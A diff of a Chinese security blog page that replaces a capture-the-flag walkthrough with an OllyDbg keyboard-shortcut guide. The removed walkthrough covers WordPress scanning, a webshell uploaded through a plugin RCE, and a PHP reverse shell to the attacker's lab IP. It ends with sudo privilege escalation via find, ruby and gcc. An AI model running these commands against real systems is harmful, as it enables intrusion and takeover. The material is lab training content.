@@ -7,7 +7,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   
   
-  <title>Plary   | magisec网络安全博客</title>
+  <title>OD使用   | magisec网络安全博客</title>
 
   
     <link rel="apple-touch-icon" href="https://ae01.alicdn.com/kf/U8f9a193ee8f04b09b08b3d8ceedb159d2.jpg">
@@ -88,99 +88,91 @@
   <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
   <div class="container post-details" id="post-details">
     <div class="post-content">
-      <div class="post-title">Plary</div>
+      <div class="post-title">OD使用</div>
       <div class="post-attach">
         <span class="post-pubtime">
           <i class="iconfont icon-updatetime" title="Update time"></i>
-          2021-01-23
+          2021-01-26
         </span>
         
       </div>
       <div class="markdown-body">
-        <p>环境情况</p>
-<p>攻击机IP：192.168.56.137</p>
-<p>靶机IP：192.168.56.139</p>
-<p>个人评测难度：初级</p>
-<p>nmap扫描</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p- -sS -oA Player 192.168.56.139</span><br></pre></td></tr></table></figure>
-<p>开放端口：</p>
-<p>80 web</p>
-<p>3306 mysql</p>
-<p><img src="https://img.rruu.net/image/6038175e8c325" alt="image-20210106111227069"></p>
-<p>firefox查看80端口</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">firefox http:&#x2F;&#x2F;192.168.56.139&#x2F;</span><br></pre></td></tr></table></figure>
-<p><img src="https://img.rruu.net/image/6038177eb2428" alt="image-20210106111254506"></p>
-<p>gobuster扫描目录</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirbuster&#x2F;directory-list-2.3-medium.txt -e -x php -t 50 -u http:&#x2F;&#x2F;192.168.56.139&#x2F;</span><br></pre></td></tr></table></figure>
-<p><img src="https://img.rruu.net/image/6038178500626" alt="image-20210106111540874"></p>
-<p>经过扫描没有任何有价值的地方，只能回去看80端口的默认页面，发现这里有一个比较奇怪的路径，我们的默认路径实在/var/www/html，我们尝试访问g@web。</p>
-<p><img src="https://img.rruu.net/image/6038178a91b4b" alt="image-20210106111437274"></p>
-<p>使用cmseek识别cms</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmseek</span><br></pre></td></tr></table></figure>
-<p><img src="https://img.rruu.net/image/6038179077dbc" alt="image-20210106111715997"></p>
-<p>检测结果为wordpress，使用wpscan扫描</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http:&#x2F;&#x2F;192.168.56.139&#x2F;g@web -e --api-token 你的token</span><br></pre></td></tr></table></figure>
-<p><img src="https://img.rruu.net/image/6038179731ae0" alt="image-20210106112310008"></p>
-<p>发现插件存在rce 我们查看漏洞说明 <a target="_blank" rel="noopener" href="https://wpscan.com/vulnerability/1527b75a-362d-47eb-85f5-47763c75b0d1">https://wpscan.com/vulnerability/1527b75a-362d-47eb-85f5-47763c75b0d1</a></p>
-<p><img src="https://img.rruu.net/image/6038179de5a84" alt="image-20210106122636395"></p>
-<p>将exp复制保存为html，进行修改。</p>
-<p><img src="https://img.rruu.net/image/603817a335ed8" alt="image-20210106122705521"></p>
-<p>使用firefox打开</p>
-<p><img src="https://img.rruu.net/image/603817a847ff7" alt="image-20210106122803604"></p>
-<p>创建一个phtml文件</p>
-<p><img src="https://img.rruu.net/image/603817ad72c62" alt="image-20210106122831906"></p>
-<p>上传完毕</p>
-<p><img src="https://img.rruu.net/image/603817b2c8a9e" alt="image-20210106122934459"></p>
-<p>测试可以成功执行木马</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.56.139&#x2F;g@web&#x2F;wp-content&#x2F;uploads&#x2F;wpsp&#x2F;1609906866_test.phtml?magisec&#x3D;id</span><br></pre></td></tr></table></figure>
-<p><img src="https://img.rruu.net/image/603817b8d14b4" alt="image-20210106123020885"></p>
-<p>使用php反弹shell</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 9000</span><br></pre></td></tr></table></figure>
-<p><img src="https://img.rruu.net/image/603817bde0b88" alt="image-20210106124515633"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http:&#x2F;&#x2F;192.168.56.139&#x2F;g@web&#x2F;wp-content&#x2F;uploads&#x2F;wpsp&#x2F;1609906866_test.phtml?magisec&#x3D;php%20%2Dr%20%27%24sock%3Dfsockopen%28%22192%2E168%2E56%2E137%22%2C9000%29%3Bexec%28%22%2Fbin%2Fsh%20%2Di%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27</span><br></pre></td></tr></table></figure>
-<p><img src="https://img.rruu.net/image/603817c2ef7a2" alt="image-20210106124625617"></p>
-<p>python切换bash</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#39;import pty;pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure>
-<p><img src="https://img.rruu.net/image/603817c871f23" alt="image-20210106131801221"></p>
-<p>进入mysql收集信息</p>
-<p><img src="https://img.rruu.net/image/603817cd5a323" alt="image-20210106131820892"></p>
-<p>使用密码登录用户，经过尝试发现hackNos@9012!!是security用户的密码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su security</span><br></pre></td></tr></table></figure>
-<p><img src="https://img.rruu.net/image/603817d2a24c0" alt="image-20210106131940254"></p>
-<p>查看sudo配置</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
-<p><img src="https://img.rruu.net/image/603817d815127" alt="image-20210106132041759"></p>
-<p>使用find执行hackNos-boat用户的shell</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -u hackNos-boat find . -exec &#x2F;bin&#x2F;sh \; -quit</span><br></pre></td></tr></table></figure>
-<p><img src="https://img.rruu.net/image/603817dcdbc18" alt="image-20210106132911934"></p>
-<p>python切换bash</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#39;import pty;pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure>
-<p><img src="https://img.rruu.net/image/603817e1a5ecd" alt="image-20210106133230061"></p>
-<p>查看sudo配置</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
-<p><img src="https://img.rruu.net/image/603817e6723f5" alt="image-20210106133322781"></p>
-<p>使用ruby执行hunter用户的shell</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -u hunter ruby -e &#39;exec &quot;&#x2F;bin&#x2F;sh&quot;&#39;</span><br></pre></td></tr></table></figure>
-<p><img src="https://img.rruu.net/image/603817eb3c0c4" alt="image-20210106133407678"></p>
-<p>python切换bash</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#39;import pty;pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure>
-<p><img src="https://img.rruu.net/image/603817f016ace" alt="image-20210106133455150"></p>
-<p>查看sudo配置</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
-<p><img src="https://img.rruu.net/image/603817f4c73a1" alt="image-20210106133516061"></p>
-<p>使用gcc执行root用户的shell</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo gcc -wrapper &#x2F;bin&#x2F;sh,-s .</span><br></pre></td></tr></table></figure>
-<p><img src="https://img.rruu.net/image/603817f9e7046" alt="image-20210106133609598"></p>
-<p>查看flag</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;root&#x2F;root.txt</span><br></pre></td></tr></table></figure>
-<p><img src="https://img.rruu.net/image/603817feb6d3a" alt="image-20210106133628062"></p>
+        <h2 id="OD窗口"><a href="#OD窗口" class="headerlink" title="OD窗口"></a>OD窗口</h2><p><img src="https://img.rruu.net/image/605154d855230" alt="image-20210126171441394"></p>
+<h2 id="OD快捷键"><a href="#OD快捷键" class="headerlink" title="OD快捷键"></a>OD快捷键</h2><ul>
+<li>Ctrl + F2 重启程序，即重新启动被调试程序（ 重新载入程序 ）。如果当前没有调试的程序，OllyDbg会运行历史列表［historylist］中的第一个程序。程序重启后，将会删除所有内存断点和硬件断点。译者注：从实际使用效果看，硬件断点在程序重启后并没有移除。</li>
+<li>Alt + F2     关闭，即关闭被调试程序。如果程序仍在运行，会弹出一个提示信息，询问您是否要关闭程序。</li>
+<li>F2  设置断点(INT3型断点)，只要在光标定位的位置（上图中灰色条）按 F2 键即可，再按一次 F2键则会删除断点。</li>
+<li>Shift + F2    设置条件断点</li>
+<li>F3  弹出 “ 打开32位.EXE文件 “ 对话框。选择可执行文件，并可以输入运行参数。</li>
+<li>F4  运行到所选择的那一行。作用就是直接运行到光标所在位置处暂停。即 执行到光标所在位置(直接转到要调试的位置)</li>
+<li>Shift + F4   设置记录断点（一种条件断点，当条件满足时一些表达式的值会记录下来）， 详情参见断点［Breakpoint］。</li>
+<li>F5  最大化当前窗口或将当前窗口大小改为正常化。</li>
+<li>Alt + F5 让 OllyDbg 总在最前面。</li>
+<li>F6  切换到下一个窗口。 </li>
+<li>Shift + F6   切换到前一个窗口。</li>
+<li>F7  单步步入到下一条命令（ 单步进入 ），如果当前命令是一个函数［Call］，则会停在这个函数体的第一条命令上。如果当前命令是是含有REP前缀，则只执行一次重复操作。</li>
+<li>Shift + F7   与 F7 相同，但是如果被调试程序发生异常而中止，调试器会首先尝试步入被调试程序指定的异常处理（请参考忽略Kernel32中的内存非法访问）。</li>
+<li>Ctr l+ F7 自动步入，在所有的函数调用中一条一条地执行命令（就像按住 F7 键不放一样，只是更快一些）。当您执行其他一些单步命令，或者程序到达断点，或者发生异常时，自动步入过程都会停止。每次单步步入，OllyDbg都会更新所有的窗口。所以为了提高自动步入的速度，请您关闭不必要成窗口，对于保留的窗口最好尽量的小。按Esc键，可以停止自动步入。</li>
+<li>F8  单步步过到下一条命令（ 单步跳过 ）。如果当前命令是一个函数，则一次执行完这个函数（除非这个函数内部包含断点，或发生了异常）。如果当前命令是含有REP前缀，则会执行完重复操作，并停在下一条命令上。</li>
+<li>Shift + F8   与 F8 相同，但是如果被调试程序发生异常而中止，调试器会首先尝试步过被调试程序指定的异常处理（请参考忽略 Kernel32 中的内存非法访问）。</li>
+<li>Ctrl + F8    自动步过，一条一条的执行命令，但并不进入函数调用内部（就像按住 F8 键不放一样，只是更快一些）。当您执行其他一些单步命令，或者程序到达断点，或者发生异常时，自动步过过程都会停止。每次单步步过，OllyDbg都会更新所有的窗口。所以为了提高自动步过的速度，请您关闭不必要成窗口，对于保留的窗口最好尽量的小。按Esc键，可以停止自动步过。</li>
+<li>F9  运行，遇到断点则停在断点位置。如果没有设置相应断点的话，被调试的程序将直接开始运行直到结束。</li>
+<li>Shift + F9   与 F9 相同，但是如果被调试程序发生异常而中止，调试器会首先尝试执行被调试程序指定的异常处理（请参考忽略Kernel32中的内存非法访问）。</li>
+<li>Ctrl + F9    把本层call执行完。即执行函数代码内的命令，直到遇到 RETN 命令，用于跳出函数体。在此期间不进入子函数也不更新CPU数据。因为程序是一条一条命令执行的，所以速度可能会慢一些。按Esc键，可以停止跟踪。</li>
+<li>Alt + F9     执行直到返回到用户代码段，跟踪程序直到指令所属于的模块不在系统目录中，在此期间不进入子函数也不更新CPU数据。因为程序是一条一条执行的，所以速度可能会慢一些。按Esc键，可以停止跟踪。</li>
+<li>F10    打开与当前窗口或面板相关的快捷菜单。</li>
+<li>Ctrl + F11   Run 跟踪步入，一条一条执行命令，进入每个子函数调用，并把寄存器的信息加入到Run跟踪的存储数据中。Run跟踪不会同步更新CPU窗口。</li>
+<li>F12 暂停程序，F9 可以继续运行。</li>
+<li>Ctrl + F12   Run 跟踪。步过，一条一条执行命令，但是不进入子函数调用，并把寄存器的信息加入到Run跟踪的存储数据中。Run跟踪不会同步更新CPU窗口。</li>
+<li>Esc     如果当前处于自动运行或跟踪状态，则停止自动运行或跟踪。如果CPU显示的是跟踪数据，则显示真实数据。</li>
+<li>空格   点击反汇编窗口，可以修改原有汇编代码</li>
+<li>分号(或者直接双击) 增加注释</li>
+<li>回车 Enter 将选中的命令添加到命令历史［command history］中，如果当前命令是一个跳转、函数或者是转换表的一个部分，则进入到目的地址。即在返汇编窗口里面点击 call，可以查看 call 内反汇编代码。</li>
+<li>Alt + B  显示断点窗口。在这个窗口中，您可以编辑、删除、或跟进到断点处。</li>
+<li>Alt + C  显示 CPU 窗口。</li>
+<li>Alt + E  显示模块列表［list of modules］。</li>
+<li>Alt + K  显示调用栈［Call stack］窗口。</li>
+<li>Alt + L  显示日志窗口。</li>
+<li>Alt + M  显示内存窗口。</li>
+<li>Alt + O  显示选项对话框［Options dialog］</li>
+<li>Alt + X  关闭 OllyDbg。</li>
+<li>退格键 移除选中部分的自动分析信息。如果分析器将代码误识别为数据，这个快捷键就非常有用。</li>
+<li>Alt + 退格键    撤消所选部分的修改，以备份数据的相应内容替换所选部分。仅当备份数据存在且与所选部分不同时可用。</li>
+<li>Ctrl+F1 如果API帮助文件已经选择，将打开与首个选择行内的符号名相关联的帮助主题。</li>
+<li>Ctrl+F5  打开与首个选择的命令相对应的源文件。</li>
+<li>Alt+F7  转到上一个找到的参考。</li>
+<li>Alt+F8  转到下一个找到参考。</li>
+<li>Ctrl+A  分析当前模块的代码段。</li>
+<li>Ctrl+B  开始二进制搜索。</li>
+<li>Ctrl+C  复制所选内容到剪贴板。复制时会简单地按列宽截断不可见内容，如果希望排除不需要的列，可把这些列的宽度调整到最小。</li>
+<li>Ctrl+E  以二进制（十六进制）格式编辑所选内容。</li>
+<li>Ctrl+F  开始命令搜索。</li>
+<li>Ctrl+G  转到某地址。该命令将弹出输入地址或表达式的窗口。该命令不会修改 EIP。</li>
+<li>Ctrl+J   列出所有的涉及到该位置的调用和跳转，在您用这个功能之前，您必须使用分析代码功能。</li>
+<li>Ctrl+K  查看与当前函数相关的调用树［Call tree］。在您用这个功能之前，您必须使用分析代码功能。</li>
+<li>Ctrl+L  搜索下一个，重复上一次的搜索内容。</li>
+<li>Ctrl+N  打开当前模块的名称（标签）列表。</li>
+<li>Ctrl+O  扫描object文件。扫描Object文件。该命令会显示扫描Object文件对话框，您可以在该对话框中选择Object文件或者lib文件，并扫描这个文件，试图找到在实际代码段中用到的目标模块。</li>
+<li>Ctrl+R  搜索所选命令的参考。该命令扫描激活模块的全部可执行代码，以找到涉及到首个选中的命令的全部相关参考（包括：常量、跳转及调用），您可以在参考中使用快捷键Alt+F7 和 Alt+F8来浏览这些参考。为便于您使用，被参考的命令也包含在该列表中。</li>
+<li>Ctrl+S  命令搜索。该命令显示命令查找［Find command］对话框供您输入汇编命令，并从当前命令开始搜索。</li>
+<li>星号 (*)    转到原始位置（激活线程的EIP处）。</li>
+<li>Ctrl + 星号(*)   指定新的起始位置，设置当前所选线程的EIP为首个选择字节的地址。您可以在选择EIP并撤消该操作。</li>
+<li>加号 (+)    如果run跟踪［run trace］ 没有激活，则根据命令历史［command history］跳到下一条运行过命令的地方；否则跳到Run跟踪的下一个记录。</li>
+<li>Ctrl + 加号 跳到前一个函数开始处。（注意只是跳到，并不执行）</li>
+<li>减号 (-) 如果run跟踪［run trace］ 没有激活，则根据命令历史［command history］跳到前一条运行过命令的地方；否则跳到Run跟踪的前一个记录。</li>
+<li>Ctrl + 减号 跳到下一个函数开始处。（注意只是跳到，并不执行）</li>
+<li>空格   修改命令。您可在显示对话框中以汇编语言修改实际指令或输入新指令，这些指令将替换实际代码，您也可以在想要修改的指令处双击鼠标。</li>
+<li>冒号(:)  添加标签。显示添加标签窗口［Add label］或修改标签窗口［Changelabel］，您可在此输入与首个选择的命令中的第一个字节相关联的标签（符号名）。注意，在多种编程语言中，冒号可以是标签的一部分。</li>
+<li>分号 (;)  添加注释［comment］。显示添加注释窗口［Add label］或修改注释窗口［Changelabel］，您可在此输入与首条所选命令的第一个字节相关联的注释（注释串会显示在最后一列中）。</li>
+<li> 注意，多种汇编语言使用分号作为注释开始。您也可以在注释列双击需要注释的命令行。</li>
+</ul>
 
       </div>
       
         <div class="prev-or-next">
           <div class="post-foot-next">
             
-              <a href="/2021/01/20/netstart/" target="_self">
+              <a href="/2021/01/25/2.%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7%E4%BB%8B%E7%BB%8D/" target="_self">
                 <i class="iconfont icon-chevronleft"></i>
                 <span>Prev</span>
               </a>
@@ -189,13 +181,13 @@
           <div class="post-attach">
             <span class="post-pubtime">
               <i class="iconfont icon-updatetime" title="Update time"></i>
-              2021-01-23
+              2021-01-26
             </span>
             
           </div>
           <div class="post-foot-prev">
             
-              <a href="/2021/01/24/1.%E5%A3%B3%E4%B8%8E%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80%E7%9A%84%E5%9F%BA%E6%9C%AC%E8%AE%A4%E7%9F%A5/" target="_self">
+              <a href="/2021/01/27/4.%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80/" target="_self">
                 <span>Next</span>
                 <i class="iconfont icon-chevronright"></i>
               </a>
@@ -205,6 +197,18 @@
       
     </div>
     
+  <div class="post-catalog" id="catalog">
+    <div class="title">Contents</div>
+    <div class="catalog-content">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#OD%E7%AA%97%E5%8F%A3"><span class="toc-text">OD窗口</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#OD%E5%BF%AB%E6%8D%B7%E9%94%AE"><span class="toc-text">OD快捷键</span></a></li></ol>
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
 
     
       <div class="comments-container">
